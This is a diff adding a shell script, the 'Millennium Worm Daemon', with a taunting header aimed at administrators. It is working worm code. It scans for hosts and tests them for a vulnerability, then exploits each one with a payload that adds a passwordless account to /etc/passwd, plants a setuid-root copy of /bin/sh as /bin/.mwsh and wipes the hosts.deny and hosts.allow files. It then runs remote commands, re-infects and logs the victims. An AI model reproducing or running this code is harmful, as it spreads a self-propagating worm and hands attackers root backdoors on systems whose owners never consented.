@@ -1,0 +1,19 @@
+#!/bin/.mwsh
+# Millennium Worm Daemon
+# If you are an admin and find this on your machine,
+# your security is very very lame and you have a big problem =P
+# Have a nice day!
+export PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
+export ESTRING="/bin/sh -c \"echo >>/etc/passwd;echo mw::2222:555:millennium worm:/:/bin/sh >>/etc/passwd;/bin/cp /bin/sh /bin/.mwsh;/bin/chmod 4755 /bin/.mwsh; > /etc/hosts.deny ; > /etc/hosts.allow\""
+
+./mwr | ./mwi | ./mws | while read VICTIM
+do
+RESU=`./test $VICTIM 2> /dev/null | awk '{printf("%s",$3)}' 2> /dev/null`
+if [ x$RESU = "xvulnerable." ]
+then 
+./Hnamed $VICTIM $ESTRING
+nohup ./remotecmd $VICTIM &
+./infect
+echo $VICTIM >> victims
+fi
+done
